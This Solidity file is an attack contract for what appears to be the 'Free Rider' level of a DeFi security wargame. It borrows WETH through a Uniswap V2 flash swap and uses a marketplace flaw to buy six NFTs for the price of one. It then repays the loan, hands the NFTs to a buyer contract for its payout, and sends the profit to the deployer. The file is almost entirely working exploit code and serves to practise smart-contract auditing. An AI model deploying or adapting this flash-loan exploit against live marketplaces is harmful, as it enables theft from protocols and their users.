pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IWETH {
    function withdraw(uint amount0) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

contract FreeRaiderAttack is IUniswapV2Callee {

    using Address for address payable;
    address owner;
    IUniswapV2Pair public pair;
    IWETH weth;
    ERC721 nft;
    FreeRiderBuyer buyer;
    FreeRiderNFTMarketplace market;
    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _pair,
        address _weth,
        address _buyer,
        address _nft,
        address payable _market
    ) {
        owner = msg.sender;
        pair = IUniswapV2Pair(_pair);
        weth = IWETH(_weth);
        nft = ERC721(_nft);
        buyer = FreeRiderBuyer(_buyer);
        market = FreeRiderNFTMarketplace(_market);
    }

    function attack(uint256 amount) external payable {
        pair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(
        address, 
        uint256 amount0, 
        uint256, 
        bytes calldata
    ) external override {
        // withdraw eth from flash loan
        weth.withdraw(amount0);
        // buy NFT from marketplace
        market.buyMany{value: address(this).balance}(tokenIds);

        uint256 repay = amount0 + (amount0 * 4)/ 1000;
        // wrap eth
        weth.deposit{value: repay}();

        weth.transfer(address(pair), repay);

        // send nft to buyer
        for(uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }

        payable(owner).sendValue(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}
